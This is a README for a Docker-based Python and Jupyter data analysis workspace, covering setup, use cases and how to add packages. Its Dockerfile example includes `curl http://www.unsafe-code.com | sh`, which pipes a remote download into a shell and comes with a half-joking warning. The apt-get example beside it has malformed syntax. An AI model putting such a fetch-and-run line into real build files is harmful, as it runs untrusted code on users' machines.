# Data Analysis Workspace

Get started on any new project without any hassle setting up your environment. Leveraging the power of Docker, this workspace allows you to focus more on coding and less on configuring your setup. Here's why I use Docker to run my projects:

- **Consistent Environments**: Maintain the same version across different computers, fostering collaborative and seamless working.
- **Dependency Management**: Ease of tracking and installing dependencies, encapsulated within the Docker setup.
- **Security**: Create isolated environments, protecting your system from potential vulnerabilities.

## Features
- Dockerized Python analytics workspace with Jupyter Notebooks.
- Easily manage and install new packages through a simple configuration.
- An organized folder structure to manage your notebooks, data and custom libraries.

## Prerequisites
Before diving in, it's beneficial to have a basic understanding of:
- Python programming.
- Fundamental data science concepts.
- Docker and containerization (though not mandatory, as you'll get the hang of it as you use the workspace).

## Getting Started
To get started with the Data Analysis Workspace, follow these steps:
1. **Install Docker**: Visit [Docker's official website](https://docs.docker.com/get-docker/) to install Docker on your system.
2. **Fork the Repository**: Click [here](https://github.com/FlexDW/data-analysis-workspace/fork) to fork the repository. Forking allows you to have your copy where you can maintain your notebook source code on GitHub.
3. **Run the Workspace**: Execute the command `docker compose up` from the project's root folder. Note that the initial setup might take some time as it sets up Python and necessary packages.
4. **Access Jupyter Notebooks**: Once the setup completes, find a link in the logs resembling: `http://127.0.0.1:8888/?token=ONE_TIME_TOKEN`. Click on this link to access your Jupyter Notebook environment.

## Use Cases
This workspace is versatile, facilitating various data science tasks such as:
- Data exploration and visualization.
- Machine learning model development and testing.
- Collaborative data science research and projects.
- General Python script development.

## Adding Packages
In order to enhance your workspace, you can easily add Python packages and other dependencies:

### Python Packages
To add Python packages, add them to the `requirements.txt` file, following the standard notation:

```plaintext
package-name==1.1.2
another-package
```

### Other Dependencies
For additional dependencies, introduce RUN commands in the Dockerfile. Here is an example where abc and xyz packages are being installed


```Dockerfile
RUN apt-get install abc, xyz
RUN curl http://www.unsafe-code.com | sh 
```

**Note:** In all seriousness, be careful installing via curl from untrusted sources, even on a dockerized setup. 

After making changes, rebuild the setup using the commands:

```
docker compose build
docker compose up
```

## Feedback and Contributions
Let me know how you like the setup, all feedback welcome. Feel free to raise issues or submit pull requests. 
